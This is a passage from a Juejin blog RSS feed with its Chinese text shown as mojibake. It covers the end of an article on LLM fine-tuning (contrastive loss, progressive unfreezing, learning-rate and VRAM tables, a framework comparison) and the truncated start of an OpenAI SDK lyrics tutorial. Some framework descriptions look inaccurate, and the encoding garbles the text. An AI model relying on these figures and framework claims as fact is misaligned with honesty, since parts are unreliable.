<li>é€šä¿—è§£é‡Šï¼šè®­ç»ƒæ—¶ä¸å…‰ç»™æ­£æ ·æœ¬ï¼Œè¿˜ç»™è´Ÿæ ·æœ¬ï¼Œè®©æ¨¡å‹å­¦ä¼š â€œå¯¹æ¯”ç€åˆ¤æ–­â€ã€‚
<ol>
<li><strong>é”šæ ·æœ¬ï¼ˆAnchorï¼‰</strong>ï¼šåŸå§‹è¾“å…¥æ–‡æœ¬ â†’ æ¯”å¦‚ â€œè¿™éƒ¨ç”µå½±è¶…å¥½çœ‹â€ï¼›</li>
<li><strong>æ­£æ ·æœ¬ï¼ˆPositiveï¼‰</strong>ï¼šé”šæ ·æœ¬çš„<strong>æ­£ç¡®æ ‡ç­¾è¯</strong> â†’ æ¯”å¦‚ â€œç²¾å½©â€ï¼ˆå¯¹åº”æ­£é¢æƒ…æ„Ÿï¼‰ï¼›</li>
<li><strong>è´Ÿæ ·æœ¬ï¼ˆNegativeï¼‰</strong>ï¼šé”šæ ·æœ¬çš„<strong>é”™è¯¯æ ‡ç­¾è¯ / åŒç±»é”™è¯¯æ–‡æœ¬</strong> â†’ æ¯”å¦‚ â€œç³Ÿç³•â€ï¼ˆå¯¹åº”è´Ÿé¢æƒ…æ„Ÿï¼‰ã€â€œè¿™éƒ¨ç”µå½±è¶…çƒ‚â€ã€‚</li>
</ol>
</li>
<li>é€šè¿‡å¯¹æ¯”æŸå¤±å‡½æ•°ï¼ˆå¦‚InfoNCEï¼‰æ‹‰è¿‘æ­£æ ·æœ¬è·ç¦»ï¼Œæ¨è¿œè´Ÿæ ·æœ¬è·ç¦»
<ol>
<li>æœ€å¸¸ç”¨çš„æŸå¤±æ˜¯ <strong>InfoNCE æŸå¤±</strong>ï¼Œæ ¸å¿ƒé€»è¾‘æ˜¯ï¼š
<ol>
<li>è®©<strong>é”šæ ·æœ¬å’Œæ­£æ ·æœ¬çš„ç‰¹å¾å‘é‡å°½å¯èƒ½æ¥è¿‘</strong>ï¼ˆç›¸ä¼¼åº¦è¶Šé«˜è¶Šå¥½ï¼‰ï¼›</li>
<li>è®©<strong>é”šæ ·æœ¬å’Œè´Ÿæ ·æœ¬çš„ç‰¹å¾å‘é‡å°½å¯èƒ½è¿œç¦»</strong>ï¼ˆç›¸ä¼¼åº¦è¶Šä½è¶Šå¥½ï¼‰ï¼›</li>
<li>æŸå¤±å‡½æ•°ä¼šæƒ©ç½š â€œé”šæ­£ç¦»å¾—è¿œâ€â€œé”šè´Ÿç¦»å¾—è¿‘â€ çš„æƒ…å†µï¼Œé€¼ç€æ¨¡å‹å­¦å‡ºç²¾å‡†çš„ç‰¹å¾ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>é€‚ç”¨åœºæ™¯ï¼šè¯­ä¹‰ç›¸ä¼¼åº¦è®¡ç®—ï¼›æ£€ç´¢å¢å¼ºç”Ÿæˆï¼›å¯¹è¯ç³»ç»Ÿ</li>
<li>æ•°æ®æ„é€ ï¼šæ­£æ ·æœ¬ï¼šè¯­ä¹‰ç›¸ä¼¼çš„æ–‡æœ¬å¯¹ï¼›  è´Ÿæ ·æœ¬ï¼šéšæœºé‡‡æ ·æˆ–å›°éš¾è´Ÿæ ·æœ¬æŒ–æ˜</li>
</ol>
</li>
<li>
<p>æ¸è¿›å¼è§£å†»ï¼ˆProgressive Unfreezingï¼‰ï¼Œæ¯”è¾ƒé€‚åˆï¼šP-tuning v2/Adapter/LoRA</p>
<ol>
<li>é€šä¿—è§£é‡Šï¼šè®­ç»ƒå‰æœŸ<strong>å†»ç»“å…¨éƒ¨æ¨¡å‹å‚æ•°</strong>ï¼Œè®­ç»ƒåæœŸ<strong>è§£å†»æ¨¡å‹æœ€å 1~2 å±‚</strong>ï¼Œä¸€èµ·å¾®è°ƒã€‚</li>
<li>åŸå› ï¼šæ¨¡å‹æµ…å±‚å­¦çš„æ˜¯é€šç”¨ç‰¹å¾ï¼ˆæ¯”å¦‚å­—è¯ï¼‰ï¼Œæ·±å±‚å­¦çš„æ˜¯ä»»åŠ¡ç‰¹å¾ï¼ˆæ¯”å¦‚è¯­ä¹‰ï¼‰ï¼›åæœŸè§£å†»æ·±å±‚ï¼Œèƒ½è®©æ¨¡å‹æ›´å¥½åœ°é€‚é…ä»»åŠ¡ã€‚</li>
<li>ä½œç”¨ï¼šæ•ˆæœèƒ½å†æ¶¨ 1~3 ä¸ªç‚¹ï¼Œä½†ä»£ä»·æ˜¯æ˜¾å­˜å ç”¨å¢åŠ ï¼ˆå› ä¸ºè¦è®­æ¨¡å‹æ·±å±‚å‚æ•°ï¼‰ã€‚</li>
<li>ä¼˜ç‚¹ï¼š
<ol>
<li>æ•ˆæœæå‡æ˜æ˜¾ï¼šè§£å†»æ·±å±‚åï¼Œæ¨¡å‹èƒ½æŠŠå°æ¨¡å—çš„ä»»åŠ¡ç‰¹å¾å’Œæ·±å±‚è¯­ä¹‰ç»“åˆï¼Œå‡†ç¡®ç‡æ¶¨ 1~3 ä¸ªç‚¹ï¼›</li>
<li>é¿å…è¿‡æ‹Ÿåˆï¼šå‰æœŸå°æ¨¡å—å­¦ä»»åŠ¡è§„åˆ™ï¼ŒåæœŸè§£å†»æ·±å±‚ä¸ä¼šç ´åå·²å­¦çŸ¥è¯†</li>
</ol>
</li>
<li>ç¼ºç‚¹ï¼š
<ol>
<li>æ˜¾å­˜å ç”¨å¢åŠ ï¼šè§£å†»æ¨¡å‹å±‚åï¼Œè¦è®¡ç®—è¿™äº›å±‚çš„æ¢¯åº¦ï¼Œæ˜¾å­˜å¤šå  20%~30%ï¼›</li>
<li>è°ƒè¯•æˆæœ¬å˜é«˜ï¼šè¦è°ƒ â€œè§£å†»æ—¶æœºâ€â€œè§£å†»å±‚æ•°â€ ä¸¤ä¸ªè¶…å‚æ•°ï¼Œæ¯”çº¯è®­å°æ¨¡å—éº»çƒ¦ï¼›</li>
<li>éƒ¨ç½²æ›´å¤æ‚ï¼šè§£å†»åæ¨¡å‹å‚æ•°å˜äº†ï¼Œè¦ä¿å­˜ â€œåŸæ¨¡å‹ + å°æ¨¡å— + è§£å†»å±‚å‚æ•°â€ï¼Œæ¯”çº¯å°æ¨¡å—éƒ¨ç½²éº»çƒ¦
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df5f0f82b3344aaf969b35a623ad9336~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=3G9%2F5yZIfpQ2DsRL9p811zSI99g%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-12">10 é¢å¤–çŸ¥è¯†è¡¥å……ï¼š</h4>
<ol>
<li>
<p>å…³äºå­¦ä¹ ç‡çš„é€‰æ‹©</p>





















































<table><thead><tr><th>å¾®è°ƒåœºæ™¯</th><th>æ¨¡å‹è§„æ¨¡</th><th>æ¨èå­¦ä¹ ç‡èŒƒå›´</th><th>ä¼˜åŒ–å™¨åŠå…³é”®å‚æ•°</th><th>æ ¸å¿ƒé€‚ç”¨æ¡ä»¶</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>å¸¸è§„å¾®è°ƒï¼ˆæ–‡æœ¬ç”Ÿæˆ / é—®ç­”ï¼‰</td><td>7B/13Bï¼ˆä¸»æµï¼‰</td><td>1e-5 ï½ 3e-5</td><td>AdamWï¼ˆé»˜è®¤å‚æ•°ï¼‰</td><td>é€šç”¨åœºæ™¯ï¼Œæ ‡æ³¨æ•°æ®é‡å……è¶³ï¼ˆâ‰¥10 ä¸‡æ¡ï¼‰</td><td>ä¼˜å…ˆé€‰ 1e-5 è¯•è·‘ï¼Œæ•ˆæœä¸ä½³å†ä¸Šè°ƒ</td></tr><tr><td>ç²¾ç»†åŒ–å¾®è°ƒï¼ˆå°æ•°æ®é›†ï¼‰</td><td>7B/13B</td><td>5e-6 ï½ 1e-5</td><td>AdamWï¼ˆæƒé‡è¡°å‡ 0.01ï¼‰</td><td>æ ‡æ³¨æ•°æ®é‡ï¼œ10 ä¸‡æ¡</td><td>ä½å­¦ä¹ ç‡ + æƒé‡è¡°å‡ï¼Œé¿å…è¿‡æ‹Ÿåˆ</td></tr><tr><td>è¶…å¤§è§„æ¨¡æ¨¡å‹å¾®è°ƒ</td><td>100B+</td><td>1e-7 ï½ 5e-6</td><td>AdamWï¼ˆä½æƒé‡è¡°å‡ï¼‰</td><td>åƒäº¿çº§å¤§æ¨¡å‹é€‚é…</td><td>æä½å­¦ä¹ ç‡ä¿æŠ¤é¢„è®­ç»ƒçŸ¥è¯†ï¼Œé˜²æ­¢å‚æ•°éœ‡è¡</td></tr><tr><td>å°æ¨¡å‹è®­ç»ƒ / å¾®è°ƒ</td><td>1B ä»¥ä¸‹</td><td>5e-5 ï½ 1e-4</td><td>Adam æˆ– SGDï¼ˆåŠ¨é‡ 0.9ï¼‰</td><td>å°æ¨¡å‹é€‚é…ï¼Œæ•°æ®é‡å……è¶³</td><td>é«˜å­¦ä¹ ç‡åŠ é€Ÿæ”¶æ•›ï¼ŒSGD é€‚åˆç®€å•ä»»åŠ¡</td></tr><tr><td>å¤šè½®å¯¹è¯ / ä»»åŠ¡é€‚é…</td><td>7B/13B</td><td>3e-6 ï½ 2e-5</td><td>AdamW + å­¦ä¹ ç‡è¡°å‡</td><td>ç‰¹å®šä»»åŠ¡ï¼ˆå¦‚å¯¹è¯ã€æŒ‡ä»¤è·Ÿéšï¼‰</td><td>åæœŸé€æ­¥é™é€Ÿï¼Œæå‡ä»»åŠ¡é€‚é…ç¨³å®šæ€§</td></tr></tbody></table>
</li>
<li>
<p>æ¨¡å‹è·‘èµ·æ¥çš„æ˜¾å­˜å¦‚ä½•è®¡ç®—ï¼Ÿ</p>
<ol>
<li>
<p>æ¨ç†æ‰€éœ€æ˜¾å­˜ï¼šæ¨ç†æ˜¾å­˜ â‰ˆ æ¨¡å‹å‚æ•°æ€»é‡ Ã— å•å‚æ•°ç²¾åº¦å­—èŠ‚æ•°</p>






























<table><thead><tr><th>FP64</th><th>8</th><th>ç²¾åº¦æœ€é«˜ï¼Œæ˜¾å­˜å ç”¨æœ€å¤§ï¼Œä»…ç”¨äºç§‘å­¦è®¡ç®—ï¼ŒLLM æ¨ç† / è®­ç»ƒå‡ ä¹ä¸ç”¨</th></tr></thead><tbody><tr><td>FP32</td><td>4</td><td>æ ‡å‡†æµ®ç‚¹ç²¾åº¦ï¼Œéƒ¨åˆ†è€æ¨¡å‹æ¨ç†ç”¨ï¼Œæ˜¾å­˜å ç”¨æ˜¯ FP16 çš„ 2 å€</td></tr><tr><td>FP16</td><td>2</td><td>LLM ä¸»æµæ¨ç†ç²¾åº¦ï¼Œå¹³è¡¡æ˜¾å­˜ä¸ç²¾åº¦ï¼Œå¤§éƒ¨åˆ†åœºæ™¯é¦–é€‰</td></tr><tr><td>BF16</td><td>2</td><td>ä¸ FP16 å­—èŠ‚æ•°ç›¸åŒï¼ŒåŠ¨æ€èŒƒå›´æ›´å¹¿ï¼Œé€‚åˆ GPU è®­ç»ƒåŠ é€Ÿ</td></tr><tr><td>INT8</td><td>1</td><td>é‡åŒ–ç²¾åº¦ï¼Œæ˜¾å­˜ä»…ä¸º FP16 çš„ 1/2ï¼›<strong>æ³¨æ„</strong>ï¼šä»…èƒ½è¡¨ç¤º [-128, 127] æ•´æ•°ï¼Œéœ€ä¸“ç”¨é‡åŒ–æ¡†æ¶ï¼ˆå¦‚ GPTQï¼‰ï¼Œæ¨ç†æ—¶éœ€åé‡åŒ–ï¼Œç²¾åº¦ç•¥æœ‰æŸå¤±</td></tr></tbody></table>
</li>
<li>
<p>è®­ç»ƒæ‰€éœ€æ˜¾å­˜ï¼šä¿å®ˆä¼°ç®—ï¼šè®­ç»ƒæ˜¾å­˜ â‰ˆ æ¨ç†æ˜¾å­˜ Ã— 4ï¼›å…¨å‚æ•°å¾®è°ƒç»éªŒå€¼ï¼šè®­ç»ƒæ˜¾å­˜ â‰ˆ æ¨¡å‹å‚æ•°æ€»é‡ Ã— 20 å­—èŠ‚</p>
<ol>
<li>è®­ç»ƒéœ€è¦çš„æ˜¾å­˜ï¼šè®­ç»ƒçš„å‚æ•°ç±»å‹ï¼Œåªèƒ½æ˜¯ float / BF16ï¼›</li>
<li>æœ€å°è®­ç»ƒæ‰€éœ€æ˜¾å­˜ä¿å®ˆä¼°ç®—æ˜¯åŒå‚æ•°åŒç±»å‹llm æ¨ç† çš„ 4å€ï¼›</li>
<li>åŸºæœ¬ä¸Šç”¨å‚æ•°ä¹˜ä»¥20å€å°±æ˜¯å®é™…å…¨å‚æ•°å¾®è°ƒä½¿ç”¨çš„æ˜¾å­˜å¤§å°</li>
</ol>















<table><thead><tr><th>FP16/BF16</th><th>2</th><th>è®­ç»ƒæ˜¾å­˜åŒ…å« <strong>4 éƒ¨åˆ†æ ¸å¿ƒå¼€é”€</strong>ï¼š1. æ¨¡å‹å‚æ•°æœ¬èº«ï¼ˆ1Ã—ï¼‰2. æ¢¯åº¦ä¿¡æ¯ï¼ˆ1Ã—ï¼‰3. ä¼˜åŒ–å™¨çŠ¶æ€ï¼ˆå¦‚ AdamW å  2Ã—ï¼Œå…± 4Ã— åŸºç¡€æ˜¾å­˜ï¼‰4. é¢å¤–å¼€é”€ï¼šæ‰¹é‡æ•°æ®ã€ä¸­é—´ç‰¹å¾ã€æ˜¾å­˜ç¢ç‰‡ï¼ˆç»éªŒå€¼ä¹˜ä»¥ 20 å­—èŠ‚å·²åŒ…å«æ­¤é¡¹ï¼‰</th></tr></thead><tbody><tr><td>FP32</td><td>4</td><td>æå°‘ç”¨äºå…¨é‡è®­ç»ƒï¼Œæ˜¾å­˜å ç”¨ç¿»å€ï¼Œä»…åœ¨éœ€è¦æé«˜ç²¾åº¦æ—¶ä½¿ç”¨</td></tr></tbody></table>
</li>
</ol>
</li>
<li>
<p>å¾®è°ƒæ–¹æ³•ä½¿ç”¨æ¡†æ¶ï¼š</p>
<ol>
<li><strong>æ–°æ‰‹æ˜“ä¸Šæ‰‹ / é€šç”¨åœºæ™¯é¦–é€‰</strong>ï¼š<code>Hugging Face Transformers + PEFT</code>
<ul>
<li>ä¸ç®¡æ˜¯å…¨é‡å¾®è°ƒã€LoRA/QLoRAï¼Œè¿˜æ˜¯ Prefix/P-Tuningï¼Œéƒ½èƒ½ä¸€ç«™å¼å®ç°ï¼Œä»£ç æ¨¡æ¿ä¸°å¯Œï¼Œç¤¾åŒºé—®é¢˜è§£å†³å¿«ï¼›</li>
<li>æ­é…<code>accelerate launch</code>å‘½ä»¤å°±èƒ½è½»æ¾å®ç°å¤šå¡è®­ç»ƒï¼Œæ— éœ€å¤æ‚é…ç½®ã€‚</li>
</ul>
</li>
<li><strong>å¤§æ¨¡å‹æ˜¾å­˜å—é™</strong>ï¼š<code>Transformers PEFT + bitsandbytesï¼ˆQLoRAï¼‰</code>
<ul>
<li>7B æ¨¡å‹ç”¨ 4bit é‡åŒ–ï¼Œå• 8G æ˜¾å¡å°±èƒ½è®­ï¼›13B æ¨¡å‹å• 16G æ˜¾å¡å³å¯ï¼Œæ˜¯ä¸­å°ç®—åŠ›åœºæ™¯çš„æœ€ä¼˜è§£ã€‚</li>
</ul>
</li>
<li><strong>åƒäº¿çº§æ¨¡å‹å…¨é‡å¾®è°ƒ</strong>ï¼š<code>DeepSpeed + Transformers</code>
<ul>
<li>å¼€å¯ ZeRO-3 åï¼Œèƒ½æŠŠæ˜¾å­˜å ç”¨é™ä½ 70% ä»¥ä¸Šï¼Œæ”¯æŒå¤šæœºå¤šå¡åˆ†å¸ƒå¼è®­ç»ƒï¼Œæ˜¯å·¥ä¸šç•Œå¤§æ¨¡å‹å¾®è°ƒçš„æ ‡å‡†é…ç½®ã€‚</li>
</ul>
</li>
<li><strong>ä¸­æ–‡å¤§æ¨¡å‹å¾®è°ƒ</strong>ï¼š<code>ColossalAI</code>
<ul>
<li>å¯¹ ChatGLMã€Qwenã€Baichuan ç­‰ä¸­æ–‡æ¨¡å‹çš„é€‚é…æ€§æ›´å¥½ï¼Œéƒ¨åˆ†ä¼˜åŒ–é€»è¾‘æ›´è´´åˆä¸­æ–‡è¯­æ–™ç‰¹æ€§ã€‚</li>
</ul>
</li>
<li><strong>åŸºç¡€æ ¸å¿ƒ</strong>ï¼šTransformers + PEFT æ˜¯æ‰€æœ‰æ¡†æ¶çš„ â€œåº•åº§â€ï¼ŒæŒæ¡å®ƒååˆ‡æ¢å…¶ä»–æ¡†æ¶ä»…éœ€é€‚é…å°‘é‡ä»£ç ï¼›</li>
<li><strong>æ€§èƒ½å¢å¼º</strong>ï¼š
<ol>
<li>Unsloth ï¼šã€ŒTransformers PEFT çš„æ€§èƒ½å¢å¼ºç‰ˆã€ï¼Œæ ¸å¿ƒè§£å†³ã€Œæ…¢ã€è´¹æ˜¾å­˜ã€é—®é¢˜ï¼Œå¾®è°ƒä¼˜å…ˆé€‰ï¼›</li>
<li>ktransformers æ˜¯ã€Œæ¨ç†ä¼˜å…ˆçš„ä¼˜åŒ–æ¡†æ¶ã€ï¼Œæ ¸å¿ƒè§£å†³ã€Œæ¨ç†å»¶è¿Ÿé«˜ã€é—®é¢˜ï¼Œæ¨ç†ä¼˜å…ˆé€‰ï¼›</li>
</ol>
</li>
<li><strong>ç¡¬ä»¶é€‚é…</strong>ï¼šNVIDIA GPU ä¼˜å…ˆé€‰ Unsloth/bitsandbytesï¼ŒAMD/CPU ä¼˜å…ˆé€‰åŸç”Ÿ Transformersã€‚</li>
</ol>





























































<table><thead><tr><th>æ¡†æ¶åç§°</th><th>æ ¸å¿ƒå®šä½</th><th>æ ¸å¿ƒä¼˜åŠ¿</th><th>é¦–é€‰é€‚ç”¨åœºæ™¯</th><th>å…³é”®é™åˆ¶</th></tr></thead><tbody><tr><td><strong>Hugging Face Transformers + PEFT</strong></td><td>ä¸šç•Œæ ‡é…ï¼Œå…¨åœºæ™¯é€šç”¨å¾®è°ƒæ¡†æ¶</td><td>1. ä¸€ç«™å¼æ”¯æŒæ‰€æœ‰å¾®è°ƒæ–¹æ³•ï¼ˆå…¨é‡ / LoRA/QLoRA/P-Tuning/Adapter ç­‰ï¼‰ï¼›2. API æç®€ï¼Œæ–°æ‰‹æ˜“ä¸Šæ‰‹ï¼›3. æ— ç¼å¯¹æ¥ Datasets/Accelerate ç”Ÿæ€ï¼›4. é€‚é…æ‰€æœ‰ä¸»æµæ¨¡å‹ï¼ˆLlama/ChatGLM/Qwen ç­‰ï¼‰</td><td>æ‰€æœ‰å¾®è°ƒåœºæ™¯ï¼ˆ7B/13B æ¨¡å‹ã€åˆ†ç±» / ç”Ÿæˆ / å¤šæ¨¡æ€ä»»åŠ¡ï¼‰ï¼Œæ–°æ‰‹é¦–é€‰</td><td>è®­ç»ƒé€Ÿåº¦ / æ˜¾å­˜æ•ˆç‡ä¸€èˆ¬ï¼Œæ— æè‡´ä¼˜åŒ–</td></tr><tr><td><strong>Unsloth</strong></td><td>Transformers PEFT çš„æ€§èƒ½å¢å¼ºç‰ˆï¼ˆæé€Ÿå¾®è°ƒï¼‰</td><td>1. è®­ç»ƒé€Ÿåº¦æ¯”åŸç”Ÿå¿« 2-5 å€ï¼ˆCUDA å†…æ ¸ä¼˜åŒ–ï¼‰ï¼›2. æ˜¾å­˜å†é™ 30%ï¼ˆ4bit é¢„é‡åŒ–æ¨¡å‹ç›´æ¥å¾®è°ƒï¼‰ï¼›3. API å®Œå…¨å…¼å®¹ Transformers PEFTï¼Œå‡ ä¹æ— éœ€æ”¹ä»£ç </td><td>7B/13B/70B æ¨¡å‹æé€Ÿå¾®è°ƒã€æ˜¾å­˜æåº¦å—é™ï¼ˆå• 8G/16G NVIDIA å¡ï¼‰</td><td>ä»…æ”¯æŒ NVIDIA GPUï¼ŒAMD/CPU ä¸å…¼å®¹</td></tr><tr><td><strong>ktransformers (ktrans)</strong></td><td>é«˜æ€§èƒ½æ¨ç†ä¼˜å…ˆçš„å¾®è°ƒ / æ¨ç†æ¡†æ¶</td><td>1. æ¨ç†é€Ÿåº¦æ¯”åŸç”Ÿå¿« 3-10 å€ï¼ˆTensorRT/ONNX ç¼–è¯‘ä¼˜åŒ–ï¼‰ï¼›2. æ”¯æŒå¾®è°ƒ + æ¨ç†ä¸€ä½“åŒ–ï¼›3. é€‚é…ä¸­æ–‡æ¨¡å‹æ¨ç†é‡åŒ–</td><td>å¾®è°ƒåéœ€è¦ä½å»¶è¿Ÿé«˜ååæ¨ç†ï¼ˆäº§å“çº§éƒ¨ç½²ã€è¾¹ç¼˜è®¾å¤‡ï¼‰</td><td>å¾®è°ƒåŠŸèƒ½ä¸å¦‚ Transformers ä¸°å¯Œï¼Œé…ç½®ç¨å¤æ‚</td></tr><tr><td><strong>DeepSpeed</strong></td><td>è¶…å¤§è§„æ¨¡æ¨¡å‹æ˜¾å­˜ä¼˜åŒ–è®­ç»ƒæ¡†æ¶</td><td>1. ZeRO-1/2/3 æ˜¾å­˜ä¼˜åŒ–ï¼Œåƒäº¿çº§æ¨¡å‹å•å¡ / å¤šå¡è®­ç»ƒï¼›2. é›†æˆæ··åˆç²¾åº¦ã€æ¢¯åº¦ç´¯ç§¯ï¼›3. å…¼å®¹ Transformers</td><td>100B + çº§æ¨¡å‹å…¨é‡å¾®è°ƒã€å¤šæœºå¤šå¡åˆ†å¸ƒå¼è®­ç»ƒ</td><td>é…ç½®å¤æ‚ï¼Œéœ€å†™ json é…ç½®æ–‡ä»¶</td></tr><tr><td><strong>bitsandbytes</strong></td><td>QLoRA é‡åŒ–å¾®è°ƒæ ¸å¿ƒä¾èµ–</td><td>1. 4/8bit é‡åŒ–ï¼Œ7B æ¨¡å‹å• 8G å¡å³å¯è®­ç»ƒï¼›2. æ— ç¼å¯¹æ¥ Transformers/Unsloth</td><td>æ˜¾å­˜æåº¦å—é™çš„å¤§æ¨¡å‹å¾®è°ƒï¼ˆ7B/13B/70Bï¼‰</td><td>ä»…æ”¯æŒ NVIDIA GPUï¼Œé‡åŒ–æœ‰è½»å¾®ç²¾åº¦æŸå¤±</td></tr><tr><td><strong>ColossalAI</strong></td><td>å›½äº§å¤§æ¨¡å‹è®­ç»ƒæ¡†æ¶</td><td>1. é€‚é…ä¸­æ–‡å¤§æ¨¡å‹ï¼ˆChatGLM/Qwen/Baichuanï¼‰ï¼›2. å¼‚æ„å¹¶è¡Œ / é›¶å†—ä½™ä¼˜åŒ–ï¼Œæ˜¾å­˜æ•ˆç‡æ¯”è‚© DeepSpeed</td><td>ä¸­æ–‡å¤§æ¨¡å‹å¾®è°ƒã€å¤šæœºå¤šå¡åˆ†å¸ƒå¼è®­ç»ƒ</td><td>ç¤¾åŒºæ”¯æŒä¸å¦‚ Hugging Faceï¼Œæ–‡æ¡£åä¸­æ–‡</td></tr><tr><td><strong>Megatron-LM</strong></td><td>ä¸‡äº¿çº§æ¨¡å‹ä¸“ç”¨è®­ç»ƒæ¡†æ¶</td><td>1. ä¸“ä¸ºåƒäº¿ / ä¸‡äº¿å‚æ•°æ¨¡å‹è®¾è®¡ï¼›2. æ”¯æŒæ¨¡å‹å¹¶è¡Œ / å¼ é‡å¹¶è¡Œ</td><td>100B + çº§æ¨¡å‹å…¨é‡å¾®è°ƒï¼ˆGPT-3 çº§ï¼‰</td><td>éƒ¨ç½²é—¨æ§›æé«˜ï¼Œéœ€å¤šèŠ‚ç‚¹é›†ç¾¤ï¼Œä»…é€‚åˆå¤§å‚</td></tr></tbody></table>
</li>
<li>
<p>å‚è€ƒèµ„æ–™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fleah126%2Farticle%2Fdetails%2F149193242" target="_blank" title="https://blog.csdn.net/leah126/article/details/149193242" ref="nofollow noopener noreferrer">1</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.baidu.com%2Farticle%2Fdetail.html%3Fid%3D3552367" target="_blank" title="https://developer.baidu.com/article/detail.html?id=3552367" ref="nofollow noopener noreferrer">2</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.huaweicloud.cn%2Fblogs%2F466230" target="_blank" title="https://bbs.huaweicloud.cn/blogs/466230" ref="nofollow noopener noreferrer">3</a></p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶å¼€å§‹è°ƒç”¨å¤§æ¨¡å‹ï¼šä½¿ç”¨ OpenAI SDK å®ç°æ­Œè¯ç”Ÿæˆï¼Œæ‰‹æŠŠæ‰‹å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7589897523269091338</link>    <guid>https://juejin.cn/post/7589897523269091338</guid>    <pubDate>2026-01-01T09:23:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589897523269091338" data-draft-id="7589920884308901914" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶å¼€å§‹è°ƒç”¨å¤§æ¨¡å‹ï¼šä½¿ç”¨ OpenAI SDK å®ç°æ­Œè¯ç”Ÿæˆï¼Œæ‰‹æŠŠæ‰‹å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,OpenAI,LLM"/> <meta itemprop="datePublished" content="2026-01-01T09:23:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ €ç§‹666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶å¼€å§‹è°ƒç”¨å¤§æ¨¡å‹ï¼šä½¿ç”¨ OpenAI SDK å®ç°æ­Œè¯ç”Ÿæˆï¼Œæ‰‹æŠŠæ‰‹å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ €ç§‹666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T09:23:42.000Z" title="Thu Jan 01 2026 09:23:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 